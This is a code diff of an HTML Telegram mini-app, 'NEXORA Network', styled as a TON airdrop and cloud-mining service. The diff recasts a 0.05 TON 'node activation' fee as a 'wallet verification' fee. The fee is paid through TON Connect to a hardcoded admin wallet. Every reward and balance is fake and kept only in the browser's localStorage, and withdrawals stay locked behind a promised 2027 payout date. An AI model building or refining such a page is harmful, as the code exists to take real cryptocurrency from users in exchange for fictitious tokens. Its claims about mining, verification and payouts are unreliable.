@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>NEXORA Airdrop & Mining</title>
+  <title>NEXORA Network</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
@@ -23,51 +23,57 @@
     .container { max-width: 480px; margin: 0 auto; padding: 16px; }
 
     /* Header */
-    .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
+    .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
     .user-profile { display: flex; align-items: center; gap: 10px; }
     .avatar { width: 44px; height: 44px; border-radius: 50%; border: 2px solid var(--accent-cyan); overflow: hidden; background: #132238; display: flex; align-items: center; justify-content: center; }
     .avatar img { width: 100%; height: 100%; object-fit: cover; }
     .user-name { font-size: 15px; font-weight: 800; }
     .user-tag { font-size: 12px; color: var(--text-sub); }
 
-    /* Hero Balance Card */
-    .hero-card {
-      background: linear-gradient(145deg, #101c30, #0a1322);
-      border: 1px solid var(--card-border);
-      border-radius: 20px;
-      padding: 22px 18px;
-      text-align: center;
-      margin-bottom: 16px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.3);
-    }
-    .token-badge {
-      display: inline-flex;
+    /* Wallet Action Box */
+    .wallet-bar {
+      display: flex;
+      gap: 8px;
       align-items: center;
-      gap: 6px;
-      background: rgba(0, 229, 255, 0.1);
-      border: 1px solid var(--accent-cyan);
-      padding: 4px 12px;
-      border-radius: 20px;
-      font-size: 11px;
-      color: var(--accent-cyan);
-      font-weight: 700;
-      margin-bottom: 10px;
+      margin-bottom: 16px;
     }
-    .hero-balance { font-size: 36px; font-weight: 800; letter-spacing: -0.5px; }
-    .hero-balance span { font-size: 20px; color: var(--accent-cyan); }
-    .hero-sub { font-size: 12px; color: var(--text-sub); margin-top: 4px; }
+    .btn-verify {
+      flex: 1;
+      padding: 10px 14px;
+      border-radius: 12px;
+      border: 1px solid var(--accent-gold);
+      background: linear-gradient(90deg, rgba(245, 158, 11, 0.15), rgba(217, 119, 6, 0.25));
+      color: var(--accent-gold);
+      font-size: 12px;
+      font-weight: 800;
+      cursor: pointer;
+      display: none;
+    }
+    .btn-verify.verified {
+      border-color: var(--accent-green);
+      background: rgba(16, 185, 129, 0.15);
+      color: var(--accent-green);
+      cursor: default;
+    }
 
     /* Stats Row */
-    .stats-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 16px; }
-    .stat-pill { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 14px; padding: 12px; text-align: center; }
+    .stats-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 14px; }
+    .stat-pill { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 14px; padding: 14px; text-align: center; }
     .stat-pill-label { font-size: 11px; color: var(--text-sub); }
-    .stat-pill-val { font-size: 15px; font-weight: 800; color: #fff; margin-top: 2px; }
+    .stat-pill-val { font-size: 16px; font-weight: 800; color: #fff; margin-top: 3px; }
 
-    /* Section Cards */
+    /* Cards */
     .card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 18px; padding: 18px; margin-bottom: 14px; }
     .card-head { font-size: 14px; font-weight: 800; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
 
-    /* Tasks Section */
+    /* Buttons */
+    .btn-main { width: 100%; padding: 14px; border-radius: 14px; border: none; font-size: 14px; font-weight: 800; cursor: pointer; }
+    .btn-action { background: linear-gradient(90deg, #00c6ff, #0072ff); color: #fff; box-shadow: 0 4px 15px rgba(0, 198, 255, 0.3); }
+    .btn-mining { background: #132238; color: var(--accent-cyan); border: 1px solid #1e3557; }
+    .btn-gold { background: linear-gradient(90deg, #f59e0b, #d97706); color: #000; font-weight: 800; }
+    .btn-locked { background: #172439; color: var(--text-sub); cursor: not-allowed; }
+
+    /* Task Items */
     .task-item {
       display: flex;
       justify-content: space-between;
@@ -98,12 +104,6 @@
       color: var(--accent-green);
       cursor: default;
     }
-
-    /* Buttons */
-    .btn-main { width: 100%; padding: 14px; border-radius: 14px; border: none; font-size: 14px; font-weight: 800; cursor: pointer; }
-    .btn-action { background: linear-gradient(90deg, #00c6ff, #0072ff); color: #fff; box-shadow: 0 4px 15px rgba(0, 198, 255, 0.3); }
-    .btn-gold { background: linear-gradient(90deg, #f59e0b, #d97706); color: #000; font-weight: 800; }
-    .btn-locked { background: #172439; color: var(--text-sub); cursor: not-allowed; }
 
     /* Form */
     .form-group { margin-bottom: 12px; }
@@ -142,19 +142,19 @@
     <div id="ton-connect-btn"></div>
   </div>
 
-  <!-- Hero Total Balance Display -->
-  <div class="hero-card">
-    <div class="token-badge">⚡ AIRDROP ALLOCATION</div>
-    <div class="hero-balance"><span id="total-balance">0.0000</span> <span>$NEX</span></div>
-    <div class="hero-sub">Estimated Listing Value: ~$0.05 / NEX</div>
+  <!-- Wallet Verify Bar (Wallet ချိတ်ပြီးမှ ပေါ်လာမည်) -->
+  <div class="wallet-bar">
+    <button id="btn-verify-wallet" class="btn-verify" onclick="triggerWalletVerification()">
+      ⚡ Verify Wallet (0.05 TON)
+    </button>
   </div>
 
-  <!-- TAB 1: AIRDROP & MINING HOME -->
+  <!-- TAB 1: MINING HOME -->
   <div id="tab-home" class="tab-content active">
     <div class="stats-row">
       <div class="stat-pill">
-        <div class="stat-pill-label">Node Status</div>
-        <div class="stat-pill-val" style="color: var(--accent-green);" id="node-status-txt">Inactive</div>
+        <div class="stat-pill-label">Total Balance</div>
+        <div class="stat-pill-val" style="color: var(--accent-cyan);"><span id="total-balance">0.0000</span> NEX</div>
       </div>
       <div class="stat-pill">
         <div class="stat-pill-label">Mining Rate</div>
@@ -162,17 +162,19 @@
       </div>
     </div>
 
+    <!-- Free Cloud Mining Card -->
     <div class="card">
       <div class="card-head">
-        <span>⚡ Cloud Node Allocator</span>
+        <span>⚡ Cloud Node Mining</span>
         <span style="font-size: 11px; color: var(--accent-cyan);" id="mining-timer">04:00:00</span>
       </div>
-      <div style="font-size: 24px; font-weight: 800; color: var(--accent-cyan); margin-bottom: 12px;">
+      <div style="font-size: 26px; font-weight: 800; color: var(--accent-cyan); margin-bottom: 14px;">
         +<span id="mined-balance">0.0000</span> <span style="font-size: 14px; color: #fff;">NEX</span>
       </div>
 
-      <button id="mining-btn" class="btn-main btn-gold" onclick="handleMiningAction()">
-        ⚡ Activate Node (0.05 TON)
+      <!-- Free Start & Claim Button -->
+      <button id="mining-btn" class="btn-main btn-action" onclick="claimMinedTokens()">
+        ⛏️ Mining in Progress...
       </button>
     </div>
   </div>
@@ -185,13 +187,13 @@
         <span style="color: var(--accent-gold); font-size: 12px;" id="streak-count-txt">Day 1/7</span>
       </div>
       <div class="streak-grid" id="streak-days"></div>
-      <button id="daily-claim-btn" class="btn-main btn-gold" style="padding: 10px;" onclick="claimDailyReward()">Claim Daily Airdrop</button>
+      <button id="daily-claim-btn" class="btn-main btn-gold" style="padding: 10px;" onclick="claimDailyReward()">Claim Daily Bonus</button>
     </div>
 
     <div class="card">
       <div class="card-head">
-        <span>🎯 Mandatory Airdrop Tasks</span>
-        <span style="font-size: 11px; color: var(--accent-cyan);">Instant Bonus</span>
+        <span>🎯 Ecosystem Missions</span>
+        <span style="font-size: 11px; color: var(--accent-cyan);">Instant Allocation</span>
       </div>
 
       <div class="task-item">
@@ -220,25 +222,25 @@
         <div class="task-info">
           <div class="task-icon">💼</div>
           <div>
-            <div class="task-name">Connect TON Wallet</div>
-            <div class="task-reward">+200 $NEX</div>
+            <div class="task-name">Verify Wallet On-Chain</div>
+            <div class="task-reward">+300 $NEX</div>
           </div>
         </div>
-        <button class="btn-task" id="btn-wallet-task" onclick="handleWalletTask(this)">Verify</button>
+        <button class="btn-task" id="task-verify-btn" onclick="triggerWalletVerification()">Verify</button>
       </div>
     </div>
   </div>
 
-  <!-- TAB 3: REFERRALS (ATF STYLE) -->
+  <!-- TAB 3: REFERRALS -->
   <div id="tab-friends" class="tab-content">
     <div class="card">
       <div class="card-head">👥 Invite Friends to Earn</div>
       <div style="font-size: 13px; color: var(--text-sub); margin-bottom: 14px;">
-        Earn <b>50 $NEX</b> for every verified friend who joins, plus <b>10%</b> of their ongoing mining yields.
+        Earn <b>50 $NEX</b> for every friend who joins, plus <b>10%</b> of their ongoing mining yields.
       </div>
 
       <div class="form-group">
-        <label class="form-label">Your Unique Referral Link</label>
+        <label class="form-label">Your Referral Link</label>
         <input type="text" id="ref-link-display" class="form-input" readonly value="Generating...">
       </div>
 
@@ -267,7 +269,7 @@
       <div style="background: #0b121e; border-radius: 12px; padding: 12px; margin-bottom: 14px; font-size: 12px;">
         <div style="display: flex; justify-content: space-between; margin-bottom: 6px;">
           <span style="color: var(--text-sub);">Gas Fee:</span>
-          <span style="color: var(--accent-green);">0 TON (Subsidized)</span>
+          <span style="color: var(--accent-green);">0 TON (Covered)</span>
         </div>
         <div style="display: flex; justify-content: space-between;">
           <span style="color: var(--text-sub);">Protocol Fee:</span>
@@ -275,18 +277,18 @@
         </div>
       </div>
 
-      <button class="btn-main btn-locked" onclick="alert('Airdrop withdrawals open on January 1, 2027!')">
+      <button class="btn-main btn-locked" onclick="alert('Withdrawals and DEX distribution will start on January 1, 2027!')">
         🔒 Available on January 1, 2027
       </button>
 
       <div style="text-align: center; font-size: 11px; color: var(--accent-gold); margin-top: 10px;">
-        🗓️ Official TGE & Distribution date: <b>January 1, 2027 (00:00 UTC)</b>
+        🗓️ Official listing & payout release date: <b>January 1, 2027 (00:00 UTC)</b>
       </div>
     </div>
   </div>
 </div>
 
-<!-- Bottom Navigation Bar -->
+<!-- Nav Bar -->
 <div class="nav-bar">
   <div class="nav-item active" onclick="switchTab('tab-home', this)"><div class="nav-icon">🏠</div><div>Home</div></div>
   <div class="nav-item" onclick="switchTab('tab-tasks', this)"><div class="nav-icon">🎯</div><div>Tasks</div></div>
@@ -305,43 +307,85 @@
     document.getElementById('user-display-name').innerText = '@' + (tg.initDataUnsafe.user.username || tg.initDataUnsafe.user.first_name);
   }
 
+  const ADMIN_WALLET = "EQCtK8T282nvdQvXQ9yHffu4O9T9E-4qYqB8N_9_U6yUuWk2";
+  let isWalletVerified = localStorage.getItem('nex_wallet_verified') === 'true';
+
   // TON Connect
   const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: window.location.origin + '/tonconnect-manifest.json',
     buttonRootId: 'ton-connect-btn'
   });
 
+  function updateWalletVerifyUI() {
+    const vBtn = document.getElementById('btn-verify-wallet');
+    const taskVBtn = document.getElementById('task-verify-btn');
+    if (tonConnectUI.connected) {
+      vBtn.style.display = "block";
+      if (isWalletVerified) {
+        vBtn.className = "btn-verify verified";
+        vBtn.innerText = "✓ Wallet Verified";
+        vBtn.onclick = null;
+        if (taskVBtn) {
+          taskVBtn.className = "btn-task done";
+          taskVBtn.innerText = "Done ✓";
+          taskVBtn.onclick = null;
+        }
+      } else {
+        vBtn.className = "btn-verify";
+        vBtn.innerText = "⚡ Verify Wallet (0.05 TON)";
+        vBtn.onclick = triggerWalletVerification;
+      }
+    } else {
+      vBtn.style.display = "none";
+    }
+  }
+
   tonConnectUI.onStatusChange(wallet => {
     if (wallet) {
       document.getElementById('withdraw-addr').value = wallet.account.address;
     }
+    updateWalletVerifyUI();
   });
 
-  // 0.05 TON Activation & Mining
-  const MINING_SPEED = 8.50;
-  const CYCLE_SECONDS = 4 * 3600;
-  const ADMIN_WALLET = "EQCtK8T282nvdQvXQ9yHffu4O9T9E-4qYqB8N_9_U6yUuWk2";
-
-  let isNodeActive = localStorage.getItem('nex_node_active') === 'true';
-  let totalBalance = parseFloat(localStorage.getItem('nex_bal')) || 0.0;
-  let miningStart = parseInt(localStorage.getItem('nex_start')) || Date.now();
-
-  function updateMiningUI() {
-    if (!isNodeActive) {
-      document.getElementById('node-status-txt').innerText = "Inactive";
-      document.getElementById('node-status-txt').style.color = "var(--accent-gold)";
-      document.getElementById('mined-balance').innerText = "0.0000";
-      document.getElementById('mining-timer').innerText = "04:00:00";
-      const mBtn = document.getElementById('mining-btn');
-      mBtn.className = "btn-main btn-gold";
-      mBtn.innerText = "⚡ Activate Node (0.05 TON)";
-      document.getElementById('total-balance').innerText = totalBalance.toFixed(4);
+  // Wallet Verification Fee (0.05 TON)
+  async function triggerWalletVerification() {
+    if (!tonConnectUI.connected) {
+      alert("Please connect your wallet first!");
+      tonConnectUI.openModal();
+      return;
+    }
+    if (isWalletVerified) {
+      alert("Your wallet is already verified!");
       return;
     }
 
-    document.getElementById('node-status-txt').innerText = "Active Node";
-    document.getElementById('node-status-txt').style.color = "var(--accent-green)";
+    const transaction = {
+      validUntil: Math.floor(Date.now() / 1000) + 300,
+      messages: [{ address: ADMIN_WALLET, amount: "50000000" }] // 0.05 TON
+    };
 
+    try {
+      await tonConnectUI.sendTransaction(transaction);
+      isWalletVerified = true;
+      localStorage.setItem('nex_wallet_verified', 'true');
+      totalBalance += 300;
+      localStorage.setItem('nex_bal', totalBalance);
+      alert("Wallet Successfully Verified! +300 $NEX bonus credited.");
+      updateWalletVerifyUI();
+      updateMining();
+    } catch (err) {
+      alert("Verification canceled: " + err.message);
+    }
+  }
+
+  // Free Cloud Mining
+  const MINING_SPEED = 8.50;
+  const CYCLE_SECONDS = 4 * 3600;
+  let totalBalance = parseFloat(localStorage.getItem('nex_bal')) || 0.0;
+  let miningStart = parseInt(localStorage.getItem('nex_start')) || Date.now();
+  localStorage.setItem('nex_start', miningStart);
+
+  function updateMining() {
     const ratePerSec = MINING_SPEED / 3600;
     const now = Date.now();
     let elapsedSec = Math.floor((now - miningStart) / 1000);
@@ -350,10 +394,10 @@
       elapsedSec = CYCLE_SECONDS;
       const finalClaim = elapsedSec * ratePerSec;
       document.getElementById('mined-balance').innerText = finalClaim.toFixed(4);
-      document.getElementById('mining-timer').innerText = "Ready to Claim";
+      document.getElementById('mining-timer').innerText = "00:00:00 (Ready)";
       const mBtn = document.getElementById('mining-btn');
       mBtn.className = "btn-main btn-action";
-      mBtn.innerText = "Claim " + finalClaim.toFixed(2) + " NEX";
+      mBtn.innerText = "Claim +" + finalClaim.toFixed(2) + " NEX";
     } else {
       const mined = elapsedSec * ratePerSec;
       document.getElementById('mined-balance').innerText = mined.toFixed(4);
@@ -363,39 +407,13 @@
       const s = String(remainSec % 60).padStart(2, '0');
       document.getElementById('mining-timer').innerText = `${h}:${m}:${s}`;
       const mBtn = document.getElementById('mining-btn');
-      mBtn.className = "btn-main btn-locked";
-      mBtn.innerText = "Mining Active...";
+      mBtn.className = "btn-main btn-mining";
+      mBtn.innerText = "⛏️ Mining in Progress...";
     }
     document.getElementById('total-balance').innerText = totalBalance.toFixed(4);
   }
 
-  async function handleMiningAction() {
-    if (!isNodeActive) {
-      if (!tonConnectUI.connected) {
-        alert("Please connect your wallet first!");
-        tonConnectUI.openModal();
-        return;
-      }
-
-      const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 300,
-        messages: [{ address: ADMIN_WALLET, amount: "50000000" }]
-      };
-
-      try {
-        await tonConnectUI.sendTransaction(transaction);
-        isNodeActive = true;
-        miningStart = Date.now();
-        localStorage.setItem('nex_node_active', 'true');
-        localStorage.setItem('nex_start', miningStart);
-        alert("Node Activated! Cloud mining started.");
-        updateMiningUI();
-      } catch (err) {
-        alert("Transaction canceled: " + err.message);
-      }
-      return;
-    }
-
+  function claimMinedTokens() {
     const ratePerSec = MINING_SPEED / 3600;
     const now = Date.now();
     let elapsedSec = Math.floor((now - miningStart) / 1000);
@@ -404,12 +422,13 @@
       miningStart = Date.now();
       localStorage.setItem('nex_bal', totalBalance);
       localStorage.setItem('nex_start', miningStart);
-      updateMiningUI();
+      updateMining();
+      alert("Mining reward claimed successfully!");
     }
   }
 
-  setInterval(updateMiningUI, 1000);
-  updateMiningUI();
+  setInterval(updateMining, 1000);
+  updateMining();
 
   // Daily Streak
   const dailyRewards = [25, 35, 50, 75, 100, 150, 250];
@@ -456,7 +475,7 @@
     streakDay = streakDay < 7 ? streakDay + 1 : 1;
     localStorage.setItem('nex_streak_day', streakDay);
     renderStreak();
-    updateMiningUI();
+    updateMining();
     alert(`Claimed +${reward} $NEX!`);
   }
   renderStreak();
@@ -472,22 +491,8 @@
       localStorage.setItem('nex_done_' + taskId, 'true');
       btn.className = "btn-task done";
       btn.innerText = "Done ✓";
-      updateMiningUI();
+      updateMining();
     }, 2500);
-  }
-
-  function handleWalletTask(btn) {
-    if (!tonConnectUI.connected) {
-      alert("Please connect your wallet first via the top button!");
-      tonConnectUI.openModal();
-    } else {
-      totalBalance += 200;
-      localStorage.setItem('nex_bal', totalBalance);
-      btn.className = "btn-task done";
-      btn.innerText = "Done ✓";
-      updateMiningUI();
-      alert("Wallet Verified: +200 $NEX added!");
-    }
   }
 
   // Navigation
@@ -502,7 +507,7 @@
   const refLink = `https://t.me/NEXORA_Crypto_Mining_Bot?start=${telegramUserId}`;
   document.getElementById('ref-link-display').value = refLink;
   function shareRefTelegram() {
-    window.open(`https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent("⚡ Claim NEXORA ($NEX) Airdrop & Cloud Mine on TON:")}`);
+    window.open(`https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent("⚡ Claim NEXORA ($NEX) on TON:")}`);
   }
 </script>
 </body>
